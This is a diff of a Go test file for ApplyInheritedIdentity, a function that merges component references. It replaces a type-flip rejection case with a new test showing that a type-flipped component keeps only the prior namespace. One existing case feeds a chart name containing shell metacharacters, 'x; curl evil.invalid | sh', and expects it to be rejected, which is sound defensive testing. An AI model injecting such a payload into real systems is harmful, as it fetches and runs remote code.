@@ -2319,8 +2319,6 @@ func TestApplyInheritedIdentityRejects(t *testing.T) {
 		prior   ComponentRef
 		wantErr string
 	}{
-		{"type flip", []ComponentRef{{Name: "c", Type: ComponentTypeKustomize}},
-			ComponentRef{Name: "c", Type: ComponentTypeHelm}, "cannot preserve"},
 		{"chart with shell metacharacters", []ComponentRef{{Name: "c"}},
 			ComponentRef{Name: "c", Chart: "x; curl evil.invalid | sh"}, "valid chart name"},
 		{"chart with a newline", []ComponentRef{{Name: "c"}},
@@ -2349,6 +2347,30 @@ func TestApplyInheritedIdentityRejects(t *testing.T) {
 				t.Errorf("error = %v, want it to contain %q", err, tt.wantErr)
 			}
 		})
+	}
+}
+
+func TestApplyInheritedIdentityTypeFlipKeepsOnlyNamespace(t *testing.T) {
+	refs := []ComponentRef{
+		{Name: "flipped", Type: ComponentTypeKustomize, Namespace: "new", Path: "deploy/new", Source: "https://new.example",
+			ManifestFiles: []string{"new.yaml"}},
+		{Name: "steady", Type: ComponentTypeHelm, Namespace: "new", Chart: "new-chart"},
+	}
+	prior := []ComponentRef{
+		{Name: "flipped", Type: ComponentTypeHelm, Namespace: "old", Chart: "old-chart", Source: "https://old.example",
+			ManifestFiles: []string{"old.yaml"}},
+		{Name: "steady", Type: ComponentTypeHelm, Namespace: "old", Chart: "old-chart"},
+	}
+	want := []ComponentRef{
+		{Name: "flipped", Type: ComponentTypeKustomize, Namespace: "old", Path: "deploy/new", Source: "https://new.example",
+			ManifestFiles: []string{"new.yaml"}},
+		{Name: "steady", Type: ComponentTypeHelm, Namespace: "old", Chart: "old-chart"},
+	}
+	if err := ApplyInheritedIdentity(refs, prior); err != nil {
+		t.Fatalf("ApplyInheritedIdentity() error = %v, want a type flip not to fail the other components", err)
+	}
+	if !reflect.DeepEqual(refs, want) {
+		t.Errorf("refs = %+v, want %+v", refs, want)
 	}
 }
 
